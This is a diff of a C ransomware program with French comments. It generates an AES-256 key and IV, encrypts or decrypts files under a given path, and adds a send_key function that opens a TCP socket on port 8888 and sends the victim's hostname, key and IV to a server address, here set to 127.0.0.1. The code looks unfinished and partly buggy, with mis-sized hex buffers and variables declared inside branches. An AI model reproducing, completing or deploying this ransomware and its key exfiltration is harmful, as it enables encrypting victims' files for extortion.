@@ -61,50 +61,85 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 
 int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv, char *pKey, char *pIv)
 {
+	// Génération au format binaire
 	RAND_bytes(key, sizeKey);
 	RAND_bytes(iv, sizeIv);
-
-	bytes_to_hexa(key, pKey, sizeKey);
-	bytes_to_hexa(iv, pIv, sizeIv);
+	// Conversion en hexadécimal
+	bytes_to_hexa(key, pKey, sizeKey/2+1);
+	bytes_to_hexa(iv, pIv, sizeIv/2+1);
 }
 
-int send_key(char *pKey, char *pIv);
+int send_key(char *pKey, char *pIv, char * serveraddress )
+{
+	// Création de la socket
+	struct sockaddr_in server;
+	server.sin_family = AF_INET;
+	server.sin_port = htons(8888);
+	int sock = socket(AF_INET, SOCK_STREAM, 0);
+
+	// Convertit l'adresse IP en binaire
+	inet_pton(AF_INET, serveraddress, &server.sin_addr);
+
+	// Connexion
+	connect(sock, (struct sockaddr *)&server, sizeof(server));
+
+	// Envoi du hostname de la cible
+	char hostname[256];
+	gethostname(hostname, 256);
+	send(sock, hostname, BUFSIZE, 0);
+
+
+	// Envoi de la clé et de l'IV
+	send(sock, pKey, BUFSIZE, 0);
+	send(sock, pIv, BUFSIZE, 0);
+}
 
 int main(int argc, char *argv[])
 {
-	// Arguments: ransom [-d|-e] <key> <iv> chemin
-	if (strcmp(argv[1], "-e") == 0)
-	{ // Si -e -> chemin
-		if (argc != 3)
+	if (argc > 1)
+	{
+		// Arguments: ransom [-d|-e] <key> <iv> chemin
+		if (strcmp(argv[1], "-e") == 0)
 		{
-			printf("Correct syntax: ransom -e path\n");
-			return 0;
-		}
+			if (argc != 3)
+			{
+				printf("Correct syntax: ransom -e path\n");
+				return 0;
+			}
 
-		char de_flag = 'e';
-		char *path = argv[2];
-	}
-	else if (strcmp(argv[1], "-d") == 0)
-	{ // Si -d -> key, iv et chemin
-		if (argc != 5)
+			char de_flag = 'e';
+			char *path = argv[2];
+		}
+		else if (strcmp(argv[1], "-d") == 0)
 		{
-			printf("Correct syntax: ransom -d key iv path\n");
-			return 0;
+			if (argc != 5)
+			{
+				printf("Correct syntax: ransom -d key iv path\n");
+				return 0;
+			}
+
+			char de_flag = 'd';
+			char *key = argv[2];
+			char *iv = argv[3];
+			char *path = argv[4];
 		}
-
-		char de_flag = 'd';
-		char *key = argv[2];
-		char *iv = argv[3];
-		char *path = argv[4];
-	}
-	else
-	{ // Si ni -e ni -d -> Erreur
-		printf("You must specify -d or -e.");
+		else
+		{ // Si ni -e ni -d -> Erreur
+			printf("You must specify -d or -e\n");
+		}
+	} else {
+		printf("You must specify -d or -e\n");
 	}
 
-	// Variables relatives à la clé et au vecteur
+	// Clé & IV au format binaire
 	unsigned char key[AES_256_KEY_SIZE];
 	unsigned char iv[AES_BLOCK_SIZE];
-	char pKey[AES_256_KEY_SIZE / 2];
-	char pIv[AES_BLOCK_SIZE / 2];
+	// Clé & IV au format hexadécimal (moitié de l'espace nécessaire)
+	char pKey[AES_256_KEY_SIZE/2 +1];
+	char pIv[AES_BLOCK_SIZE/2 +1];
+
+
+	generate_key(key, sizeof(key), iv, sizeof(iv), pKey, pIv);
+	
+	send_key(pKey, pIv, "127.0.0.1");
 }
